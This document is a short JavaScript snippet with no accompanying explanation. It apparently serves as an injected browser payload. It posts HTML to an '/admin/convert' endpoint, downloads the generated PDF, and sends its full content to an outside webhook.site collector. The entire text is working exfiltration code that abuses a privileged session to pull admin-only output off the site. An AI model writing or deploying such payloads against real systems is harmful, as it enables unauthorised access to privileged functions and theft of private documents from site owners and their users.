const htmlCode = "ccc";

fetch('/admin/convert', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ htmlCode: htmlCode })
})
.then(response => {
  if (response.ok) {
    return response.json();
  }
  throw new Error('Network response was not ok.');
})
.then(data => {
  const pdfLink = data.pdfLink;
  const encpdflink = encodeURIComponent(pdfLink);

  fetch(pdfLink)
  .then(response => response.blob())
  .then(blob => {
    const reader = new FileReader();
    reader.onload = () => {
      const pdfContent = encodeURIComponent(reader.result);

      const webhookUrl = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?data=${pdfContent}`;
      fetch(webhookUrl)
      .then(() => console.log('PDF content sent to webhook'))
      .catch(error => console.error('Error sending PDF content to webhook:', error));
    };
    reader.readAsDataURL(blob);
  })
  .catch(error => console.error('Error reading PDF file:', error));
})
.catch(error => console.error('Error sending conversion request:', error));
